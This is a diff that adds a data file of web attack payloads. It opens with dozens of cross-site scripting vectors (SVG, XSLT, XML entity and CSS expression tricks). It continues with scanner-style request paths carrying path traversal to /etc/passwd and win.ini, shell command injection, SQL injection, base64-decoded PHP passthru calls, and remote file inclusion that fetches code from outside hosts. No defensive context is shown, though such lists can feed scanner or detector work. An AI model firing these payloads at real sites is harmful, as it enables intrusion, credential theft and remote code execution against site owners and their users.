@@ -1,0 +1,250 @@
+<b <script>alert(1)//</script>0</script></b>
+<b><script<b></b><alert(1)</script </b></b>
+<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div style="[a]color[b]:[c]red">XXX</div>
+<div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
+<!-- IE 6-8 --><x '="foo"><x foo='><img src=x onerror=alert(1)//'><!-- IE 6-9 --><! '="foo"><x foo='><img src=x onerror=alert(2)//'><? '="foo"><x foo='><img src=x onerror=alert(3)//'>
+<embed src="javascript:alert(1)"></embed> // O10.10â, OM10.0â, GC6â, FF<img src="javascript:alert(2)"><image src="javascript:alert(2)"> // IE6, O10.10â, OM10.0â<script src="javascript:alert(3)"></script> // IE6, O11.01â, OM10.1â
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
+<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?><root/>
+<!DOCTYPE x [	<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)">]><img />
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">	<html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x></doc>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
+<// style=x:expression\28write(1)\29>
+<form><button formaction="javascript:alert(1)">X</button>
+<event-source src="event.php" onload="alert(1)">
+<a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+<script<{alert(1)}/></script </>
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
+<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+<object allowscriptaccess="always" data="test.swf"></object>
+<style>*{x:ï½ï½ï½ï½ï½ï½ï½ï½ï½ï½(write(1))}</style>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
+<body oninput=alert(1)><input autofocus>
+<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><animation xlink:href="javascript:alert(1)"/><animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/><image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/><foreignObject xlink:href="javascript:alert(1)"/><foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/><animate attributeName="onunload" to="alert(1)"/></svg>
+<!-- Up to Opera 10.63 --><div style=content:url(test2.svg)></div><!-- Up to Opera 11.64 - see link below --><!-- Up to Opera 12.x --><div style="background:url(test5.svg)">PRESS ENTER</div>
+[A]<? foo="><script>alert(1)</script>"><! foo="><script>alert(1)</script>"></ foo="><script>alert(1)</script>">[B]<? foo="><x foo='?><script>alert(1)</script>'>">[C]<! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>">[D]<% foo><x foo="%><script>alert(1)</script>">
+<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
+<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
+<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage></svg>
+<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe><iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>
+<!-- IE 5-9 --><div id=d><x xmlns="><iframe onload=alert(1)"></div><script>d.innerHTML+='';</script><!-- IE 10 in IE5-9 Standards mode --><div id=d><x xmlns='"><iframe onload=alert(2)//'></div><script>d.innerHTML+='';</script>
+<div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div><script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!--*{color:red}   /* all UA */*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */</style>
+<img[a][b]src=x[d]onerror[c]=[e]"alert(1)">
+<a href="[a]java[b]script[c]:alert(1)">XXX</a>
+<img src="x` `<script>alert(1)</script>"` `>
+<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
+<svg xmlns="http://www.w3.org/2000/svg" id="foo"><x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/></svg>
+<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
+<img src onerror /" '"= alt=alert(1)//">
+<title onpropertychange=alert(1)></title><title title=></title>
+<!-- IE 5-8 standards mode --><a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(1)></a>"><!-- IE 5-9 standards mode --><!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//"><?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">
+<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><path d="M0,0" style="marker-start:url(test4.svg#a)"/></svg>
+/top.php?stuff='|sleep 11 #
+/8t9v8k7x.jspa?<script>document.cookie="testhvje=9403;"</script>
+/prescription/
+../../../../../../../../../../boot.ini
+<script>document.cookie="testxllt=9940;"</script>
+/examples/jsp/checkbox/libraries/adodb/server.php?sql='adodb_sql_sql_injection.nasl
+/ghswfouu.cfc?<meta http-equiv=set-cookie content="testsqmm=5713">
+/u95h6ymu.cgi?<script>document.cookie="testkhwc=4028;"</script>
+/nyjgaorz.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/h4bi26jd.mscgi?<script>document.cookie="testhrzx=1150;"</script>
+/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd
+/en-us/w4996nr0.mscgi?<meta http-equiv=set-cookie content="testttvs=7163">
+/opensiteadmin/scripts/classes/form.php?path=http://192.168.202.96:8080/frznctvhi0i5?\x00
+/recordings/nucleus/libs/pluginadmin.php?globals[dir_libs]=/etc/passwd\x00
+/ghswfouu.fts?<script>document.cookie="testsqmm=5713;"</script>
+/0rufe52p.htm?<script>cross_site_scripting.nasl</script>
+/manager/forum_2.php?msg=10&return=<script>foo</script>
+/scripts/1332010202-ror_session_fixation.nasl
+/zqqemp6j.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/proto.exe
+/awstats/awstats.pl?migrate=|echo;/./tmp/dedvphbiqt.sh;echo|awstats168582.txt
+/examples/jsp/colors/athenareg.php?pass= ;id
+/recordings/index.php?include_files[]=&include_files[query_string]=/etc/passwd
+/apavxugx.dll?<meta http-equiv=set-cookie content="testdnbh=5237">
+/cgi-perl/vssetcookie.exe
+/phpmyadmin/inc/functions.inc.php?config[ppa_root_path]=/etc/passwd\x00
+/help.php?q="&ver\x09>q66374774&rem\x09
+/gvx7m5ti.asp?<meta http-equiv=set-cookie content="testwldz=3506">
+/cgi-bin/sawmillcl.exe?ho+{complete_version}
+/cgi-bin/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00
+/main.php?logout="uname\x09#
+/ap58k3ci.kspx?<script>cross_site_scripting.nasl</script>
+/examples/jsp/colors/directorypro.cgi?want=showcat&show=../../../../../etc/passwd\x00
+/sourceforgesubscriptions_final/
+/nuh3zirz.cfm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/bmeun223.exe?<script>document.cookie="testhhwu=7044;"</script>
+/examples/jsp/colors/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd
+/en-us/fo564rei.jsp?<script>cross_site_scripting.nasl</script>
+/cgi.cgi/c32web.exe/changeadminpassword
+/help.php?q=ping;-w;10000;-n;1;1.2.3.4&rem;
+/examples/jsp/num/resetpw.php?email=../../../../../../../../../../../../etc/passwd
+/oie504mr.html?<script>document.cookie="testtpby=7052;"</script>
+/examples/jsp/colors/lib/authform.inc.php?path_pre=/etc/passwd\x00
+/main.php?stuff="&del\x09q89486418&rem\x09
+/archive.php?scriptpath=http://192.168.202.118:8080/ghl9il??
+/examples/jsp/cal/adodb-perf-module.inc.php?last_module=zzz_adoconnection{}system(id);class zzz_adoconnection{}//
+/examples/jsp/cal/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo";ls+-l;rm+/tmp/yrxsovftek"
+/examples/servlets/servlet/js/scripts.php?load=/etc/passwd\x00
+//../../../../../../../../windows/win.ini
+/javascript/manifest.exe
+/msadm/site/index.php3?authid=\"><script>alert('vulnerable')</script>
+/help.php?q=;uname\x09#
+/top.php?stuff='&rm q76213281 #
+/opensiteadmin/scripts/classes/formmanager.php?path=http://cirt.net/rfiinc.txt?\x00
+/demo/ms-pe02/catalog.php?cid=0&sid='"&sortfield=title&sortorder=asc&pagenumber=1&main=http://192.168.202.96:8080/llumt7msyau5y?&
+/4&#215;4/
+/main.php?stuff="ping\x0b-w\x0b11000\x0b-n\x0b1\x0b1.2.3.4&rem\x0b
+/dda2qr7j.exe?<script>cross_site_scripting.nasl</script>
+/main.php?frm_daynight=day&frm_passwd=&frm_referer=http%3a//192.168.24.202/&frm_user=&scr_height=&scr_width=q13664242
+/scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919008,1645922045 -- 
+/main.php?logout='&del\x09q59435268\x09#
+/en-us/account/print.php?what=article&id='
+/examples/jsp/error/minis.php?month=../../../../../../etc/passwd
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+w+0+>>ctdn
+/recordings/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
+/examples/servlets/servlet/index.php?act=arcade&do=stats&gameid=1'
+/scripts/check-lom.php?etcdir=http://cirt.net/rfiinc.txt?
+/javascript/document.key
+/h5sc3gxy.dll?<script>cross_site_scripting.nasl</script>
+/?<meta http-equiv=set-cookie content="testbfpq=3326">
+/javascript/vbs.exe
+/scripts/c0kha6w3apd3.shtml
+/egaet53a.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/ibill.pm
+/nuh3zirz.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/googlesearch/googlesearch.php?app[path][lib]=/etc/passwd\x00
+<meta http-equiv=set-cookie content="testiklc=904">
+/1qwv2p5p.do?<script>document.cookie="testvqcy=252;"</script>
+/main.php?logout="&ping\x0b-w\x0b8000\x0b-n\x0b1\x0b4.3.2.1&rem\x0b
+/javascript/oauth.exe
+/jujgxwav.fts?<script>document.cookie="testknim=9383;"</script>
+/scripts/minis.php?month=../../../../../../etc/passwd
+/fastscripts/
+//<body><script src=http://www.example.com/test?rnd=q81315649></script>
+/ygkjkngd.php?<meta http-equiv=set-cookie content="testnago=4518">
+/main.php?stuff="rm,q47628643&rem,
+/examples/jsp/num/smpwservicescgi.exe
+/vhzmaia2.html?<meta http-equiv=set-cookie content="testkogj=3979">
+/hjdzm96v.jsp?<script>document.cookie="testbyqe=7474;"</script>
+/zroo33l4.asp?<meta http-equiv=set-cookie content="testiklc=904">
+/main.php?stuff="\x0duname #
+/searchsimple.php?searwords=<script>alert(412225577702)</script>&send=search
+/fo564rei.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/script-r0/
+/examples/jsp/sessions/mlog.html?screen=/etc/passwd
+/opensiteadmin/scripts/classes/fieldmanager.php?path=http://192.168.202.96:8080/llumt7msyau5y?\x00
+/javascript/encode.exe
+/en-us/7o5qp766.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
+/d44uk9h2.idc?<meta http-equiv=set-cookie content="testmybc=2088">
+/weq93ppb.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
+/nyjgaorz.htm?<script>cross_site_scripting.nasl</script>
+/eguestproxsssql/
+/scripts/admin/connect.inc
+/<meta http-equiv=set-cookie content="testtfvh=2141">
+/examples/jsp/num/forumdisplay.php?fid=21"><script>x</script>
+/scripts/search.jsp?q=%"<script>alert(1332010391)</script>
+/cgi-bin/csguestbook.cgi?command=savesetup&setup=;system('cat /etc/passwd')
+/include/scripts/run_auto_suspend.cron.php?dir=http://cirt.net/rfiinc.txt?
+/vac1l5vm.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/servlets/servlet/shopexd.asp?catalogid='42
+/javascript/.passwd.jar
+/cgi-bin/blog.cgi?submit=viewfile&month=01&year=2004&file=|cat /etc/passwd|
+/rpxyx07v.jsp?<script>document.cookie="testbnli=1975;"</script>
+/0rufe52p.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/sugarcrm/modules/users/login.php?theme=../../../../../../../etc/passwd\x00
+ftp://192.168.24.202/*<apache_mod_proxy_ftp_glob_xss.nasl>
+/vjbrrppi.cfc?<script>cross_site_scripting.nasl</script>
+/javascript/phpbb.exe
+/static//.../.../.../.../.../.../.../.../windows/win.ini
+/javascript/htpasswd.key
+/weq93ppb.x?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/shipped.exe
+/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331918989')</script>
+/wiki.php/<script>foo</script>
+/examples/jsp/error/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00.txt
+/javascript/trash.exe
+/yver8r9o.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/manager/nessus"><script>alert('django_admin_xss.nasl')</script>/
+/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=http://192.168.202.96:8080/frznctvhi0i5??
+/jackrabbit/search.jsp?q=%"<script>alert(1331904374)</script>
+/main.php?g2_view=zipcart.download&g2_file=../../../../../../../../../../../../etc/passwd
+/0qhcnefz.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/7dbjwpw6.php?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/servlets/servlet/cwmail.exe
+/examples/jsp/colors/starnet/addons/slideshow_full.php?album_name='1914620104
+/jnt3f86c.asp?<meta http-equiv=set-cookie content="testcmax=9270">
+/manager/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wk4aztya]));die;/*
+/6dlc2zm9.jsp?<meta http-equiv=set-cookie content="testqpux=4016">
+/examples/jsp/checkbox/simple/view_page?mv_arg=|cat /etc/passwd|
+/cacti/base_qry_common.php?base_path=/etc/passwd\x00
+/recordings/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>
+/cacti/search.cgi?..\..\..\..\..\..\windows\win.ini
+/0u75ldxq.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/top.php?stuff="&ping\x0c-w\x0c7000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c
+/?<meta http-equiv=set-cookie content="testulex=4996">
+/main.php?stuff=;uname >q81835212 #
+/main.php?stuff="ping -w 9000 -n 1 1.2.3.4&rem 
+/javascript/webmail.exe
+/ripscript/
+/examples/jsp/jsp2/el/directorypro.cgi?want=showcat&show=../../../../../etc/passwd\x00
+/help.php?q=ping;-w;7000;-n;1;1.2.3.4|rem;
+/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_1wubmpss]));die;/*
+/3hlysl2x.kspx?<script>document.cookie="testgjbe=8505;"</script>
+/main.php?stuff=&ver\x09>q65268393&rem\x09
+/examples/jsp/jsp2/el/index.php?show=../../../../../../../../../../../etc/passwd\x00
+/5qnlm5z2.php3?<meta http-equiv=set-cookie content="testsixi=8451">
+/bxnyrhmh.php3?<script>document.cookie="testmjct=1867;"</script>
+/cacti/pjreview_neo.cgi?p=../../../../../../../../../../etc/passwd
+/5o9zq43e.asp?<script>cross_site_scripting.nasl</script>
+/yver8r9o.php?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 911180970,2,397451365,4,5,6,7,8,9,0,1,2,3 --
+/interface/login/login_frame.php?site=<script>alert(owasp zap);</script>' and '1'='1
+/help.php?q="\x0duname\x09>q41994252\x09#
+/cacti/lang/lang.php?lang_path=/etc/passwd\x00
+/ghostscript/
+/ybz5rz7a.asp?<script>document.cookie="testsbvw=6289;"</script>
+/auth-passwd/
+/606wkcop.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
+/top.php?stuff='&sleep\x0910\x09#
+/t_scriptrap/
+/examples/jsp/num/hw3.cgi?daysonly=0).system('id').(
+/7o5qp766.cgi?<script>cross_site_scripting.nasl</script>
+/index.php?id='
+/misc/audio.php?recording=../version.inc
+/main.php?stuff="ver&rem\x0c
+/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/fphgokkkuu.sh'); function v
+/phpmyadmin/calendar_admin.pl?config=|cat /etc/passwd|
+/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904208')</script>
+/cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919219','5'--
+/p043snfr.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/login.php?procesa=si&usuario_nkads_admin=' or isnull(1/0)/*
+/h5sc3gxy.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
+/d44uk9h2.x?<meta http-equiv=set-cookie content="testmybc=2088">
+/javascript/www1.exe
+/recordings/styles.php?toroot=/etc/passwd\x00
+/note.txt?f_notini=&t_note=&nomentreprise=blah&filenote=../../windows/win.ini
+/fo564rei.idc?<script>cross_site_scripting.nasl</script>
+/0w155a7c.idc?<script>cross_site_scripting.nasl</script>
+/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/augpuxhmyg.sh'); function v
+/header_noscript/
+/..\..\\..\..\\..\..\\..\..\boot.ini
+/examples/jsp/jsp2/jspx/sgdynamo.exe?htname=sgdynamo.exe
+/raanw4ia.exe?<img src="javascript:alert(cross_site_scripting.nasl);">
+/main.php?logout='del q43392461 #
+/examples/jsp/error/gotopage.cgi?4242+../../../../../../../../../../../../../etc/passwd
